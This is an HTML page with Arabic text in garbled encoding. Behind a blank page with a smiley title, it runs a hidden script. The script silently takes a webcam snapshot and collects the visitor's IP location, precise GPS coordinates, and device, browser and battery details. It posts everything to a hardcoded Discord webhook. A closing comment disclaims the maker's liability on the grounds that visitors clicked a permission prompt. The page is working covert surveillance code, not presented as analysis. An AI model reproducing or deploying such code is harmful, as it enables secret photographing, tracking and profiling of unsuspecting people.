<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>(â€¢-â€¢)</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        background-color: white;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      video, canvas {
        display: none;
      }
      <link rel="icon" href="https://www.securities.io/wp-content/uploads/2024/03/ChatGPT.jpeg" type="image/jpeg">
    </style>
  </head>
  <body>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    <script>
      const webhookURL = "https://discord.com/api/webhooks/1362846794458857572/-uovKrcHiDnprS1IWPLI1RSahCht_ypX_5BO8R9xEc5KZQ1XCrZSZ9uKt9VD3cbQmiXJ";
      
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setTimeout(captureAndSend, 2000);
        })
        .catch(err => {
          console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§: ", err);
        });

      function captureAndSend() {
        context.drawImage(video, 0, 0, 640, 480);
        context.font = '20px Arial';
        context.fillStyle = 'red';
        context.fillText('Ø­Ù‚ÙˆÙ‚Ùƒ Ù…Ø­ÙÙˆØ¸Ø©', 10, canvas.height - 20);

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('file', blob, 'image.png');
          
          collectAndSend().then(message => {
            formData.append('content', message);
            sendToWebhook(formData);
          }).catch(error => {
            console.error("Ø®Ø·Ø£ ÙÙŠ Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:", error);
          });
        }, 'image/png');
      }

      async function collectAndSend() {
        const ipInfo = await getIPInfo();
        const battery = await getBatteryInfo();
        const connection = await getConnectionInfo();
        const device = getDeviceInfo();
        const now = new Date().toLocaleString("ar-EG");

        let message = `ðŸ“± **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:**
- Ø§Ù„Ø¯ÙˆÙ„Ø©: ${ipInfo.country_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"} ðŸ”»
- Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${ipInfo.city || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"} ðŸ™ï¸
- Ø¹Ù†ÙˆØ§Ù† IP: ${ipInfo.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"} ðŸŒ
- Ø´Ø­Ù† Ø§Ù„Ù‡Ø§ØªÙ: ${battery.level}% ðŸ”‹
- Ù‡Ù„ Ø§Ù„Ù‡Ø§ØªÙ ÙŠØ´Ø­Ù†ØŸ: ${battery.charging}
- Ø§Ù„Ø´Ø¨ÙƒØ©: ${connection.type} ðŸ“¶ (Ø³Ø±Ø¹Ø©: ${connection.downlink})
- Ù†ÙˆØ¹ Ø§Ù„Ø§ØªØµØ§Ù„: ${connection.type} ðŸ“¡
- Ø§Ù„ÙˆÙ‚Øª: ${now} â°
- Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²: ${device.platform} ðŸ–¥ï¸
- Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${device.userAgent} ðŸ“œ
- Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${device.isMobile}
- Ø§Ù„Ø°Ø§ÙƒØ±Ø© (RAM): ${device.ram} ðŸ§ 
- Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ù†ÙˆÙŠØ©: ${device.cores} âš™ï¸
- Ù„ØºØ© Ø§Ù„Ù†Ø¸Ø§Ù…: ${device.language} ðŸŒ
- Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­: ${device.browser} ðŸŒ
- Ø¯Ù‚Ø© Ø§Ù„Ø´Ø§Ø´Ø©: ${device.screenSize} ðŸ“
- Ø¥ØµØ¯Ø§Ø± Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${device.os} ðŸ–¥ï¸
- ÙˆØ¶Ø¹ Ø§Ù„Ø´Ø§Ø´Ø©: ${device.orientation} ðŸ”„
- Ø¹Ù…Ù‚ Ø§Ù„Ø£Ù„ÙˆØ§Ù†: ${device.colorDepth} ðŸŽ¨
- ØªØ§Ø±ÙŠØ® Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ« Ù„Ù„Ù…ØªØµÙØ­: ${device.lastUpdate} ðŸ“…
- Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${device.https} ðŸ”’
- Ø¥Ù…ÙƒØ§Ù†ÙŠØ© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ: ${"geolocation" in navigator ? "Ù…Ø¯Ø¹ÙˆÙ… ðŸŒ" : "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…"}
- Ø§Ù„Ø¯Ø¹Ù… Ù„ØªÙ‚Ù†ÙŠØ© Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«: ${device.bluetooth}
- Ø¯Ø¹Ù… Ø§Ù„Ø¥ÙŠÙ…Ø§Ø¡Ø§Øª Ø§Ù„Ù„Ù…Ø³ÙŠØ©: ${device.touch}`;

        if ("geolocation" in navigator) {
          return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(async (position) => {
              message += `\n- Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude} ðŸŒ (Ø¯Ù‚Ø©: ${position.coords.accuracy} Ù…ØªØ±)`;
              resolve(message);
            }, (error) => {
              message += `\n- Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ: ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù† Ø£Ùˆ ÙØ´Ù„ Ø§Ù„ØªØ­Ø¯ÙŠØ¯ âŒ`;
              resolve(message);
            });
          });
        } else {
          message += `\n- Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ: ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ø¬Ù‡Ø§Ø² âŒ`;
          return Promise.resolve(message);
        }
      }

      async function getIPInfo() {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      }

      async function getBatteryInfo() {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          return {
            level: Math.round(battery.level * 100),
            charging: battery.charging ? "Ù†Ø¹Ù… âš¡" : "Ù„Ø§ âš¡"
          };
        }
        return { level: "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…", charging: "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…" };
      }

      async function getConnectionInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return connection ? {
          type: connection.type || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
          downlink: connection.downlink + " Ù…ÙŠØºØ§Ø¨Øª ÙÙŠ Ø§Ù„Ø«Ø§Ù†ÙŠØ©"
        } : {
          type: "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…",
          downlink: "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…"
        };
      }

      function getDeviceInfo() {
        return {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screenSize: `${screen.width}x${screen.height}`,
          orientation: (screen.orientation || {}).type || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
          colorDepth: screen.colorDepth,
          browser: detectBrowser(),
          os: detectOS(),
          isMobile: /Mobi|Android/i.test(navigator.userAgent) ? "Ù…Ø­Ù…ÙˆÙ„ ðŸ“±" : "Ø­Ø§Ø³ÙˆØ¨ ðŸ–¥ï¸",
          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
          cores: navigator.hardwareConcurrency || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
          bluetooth: !!navigator.bluetooth ? "Ù…Ø¯Ø¹ÙˆÙ… ðŸ”µ" : "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…",
          touch: 'ontouchstart' in window ? "Ù…Ø¯Ø¹ÙˆÙ… âœ‹" : "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…",
          https: location.protocol,
          lastUpdate: document.lastModified
        };
      }

      function detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes("Chrome")) return "Chrome";
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Safari")) return "Safari";
        if (ua.includes("Edge")) return "Edge";
        return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      }

      function detectOS() {
        const ua = navigator.userAgent;
        if (/Windows NT/.test(ua)) return "Windows";
        if (/Android/.test(ua)) return "Android";
        if (/iPhone|iPad/.test(ua)) return "iOS";
        if (/Linux/.test(ua)) return "Linux";
        return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      }

      function sendToWebhook(formData) {
        fetch(webhookURL, {
          method: 'POST',
          body: formData
        })
        .then(response => {
          if (response.ok) {
            console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨Ù†Ø¬Ø§Ø­');
            return response.json();
          } else {
            throw new Error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©');
          }
        })
        .then(data => console.log(data))
        .catch(error => console.error('Ø®Ø·Ø£:', error));
      }
    </script>
  </body>
</html>

<!--Ø§Ø®Ù„Ø§Ø¡ Ø§Ù„Ù…Ø³ÙˆØ¤Ù„ÙŠØ©:
Ø±Ø³Ø§Ù„Ù‡ Ù…Ù† ØµØ§Ù†Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆÙ‡ÙŠ Ø§Ù†Ù†ÙŠ Ø§Ø®Ù„ÙŠ Ù…Ø³ÙˆØ¤Ù„ÙŠØªÙŠ Ù…Ù† Ø§ÙŠ Ù‚Ø¶ÙŠØ© ØªØªÙ… Ø±ÙØ¹Ù‡Ø§ Ø¹Ù„ÙŠ ÙˆÙˆØ¶Ø¹Øª Ù‡Ø°Ø§ Ø¨Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆÙŠÙ…ÙƒÙ† Ù„ Ø§ÙŠ Ø´Ø®Øµ Ø±Ø¤ÙŠØªÙ‡ Ù„Ùˆ ÙØ¹Ù„ inspect Ø«Ø§Ù†ÙŠØ§ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠÙˆØ¬Ø¯ Ø¨Ù‡ Ø·Ù„Ø¨ Ø§Ø°Ù† ÙˆÙŠÙˆØ¬Ø¯ Ø®ÙŠØ§Ø±ÙŠÙ† Ø§Ù…Ø§ Ø±ÙØ¶ ÙˆØ§Ù…Ø§ Ù…ÙˆØ§ÙÙ‚Ù‡ Ù„Ùˆ ØªÙ… Ø¶ØºØ· Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ù‡ Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§ÙŠ Ø´ÙŠØ¡ Ø³ÙŠØ­Ø¯Ø« Ø¨Ø¹Ø¯Ù‡Ø§-->
